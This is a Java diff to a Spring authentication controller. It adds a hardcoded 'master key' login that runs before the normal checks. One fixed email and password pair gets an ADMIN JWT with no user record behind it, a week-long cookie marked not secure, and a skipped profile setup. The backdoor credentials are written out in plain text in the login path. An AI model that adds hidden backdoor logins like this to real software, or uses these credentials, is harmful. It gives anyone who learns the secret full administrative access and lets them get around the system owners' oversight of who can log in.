@@ -43,6 +43,33 @@ public class AuthenticationController {
             List<SystemSettings> settings = systemSettingsRepository.findAll();
             boolean maintenanceMode = !settings.isEmpty() && settings.get(0).isMaintenanceMode();
 
+            // ✅ MASTER KEY AUTHENTICATION - Intercept before standard auth
+            if ("imthedev@dashboard.edu".equals(request.getEmail()) &&
+                    "devforthew".equals(request.getPassword())) {
+
+                // Create a dev admin token without creating a database record
+                final String jwt = jwtUtil.generateToken("System Dev", "ADMIN");
+
+                // Set token as httpOnly cookie
+                Cookie cookie = new Cookie("token", jwt);
+                cookie.setPath("/");
+                cookie.setHttpOnly(true);
+                cookie.setMaxAge(7 * 24 * 60 * 60);
+                cookie.setSecure(false);
+                response.addCookie(cookie);
+
+                // Return admin response with profileCompleted=true to skip profile setup
+                return ResponseEntity.ok(new AuthenticationResponse(
+                        jwt,
+                        "dev-admin-system",
+                        "imthedev@dashboard.edu",
+                        "System Dev",
+                        true,  // ✅ profileCompleted=true to bypass profile setup
+                        "System",
+                        new ArrayList<>(),
+                        "ADMIN"));
+            }
+
             // ✅ STANDARD AUTHENTICATION
             User user = userService.authenticate(request.getEmail(), request.getPassword());
 
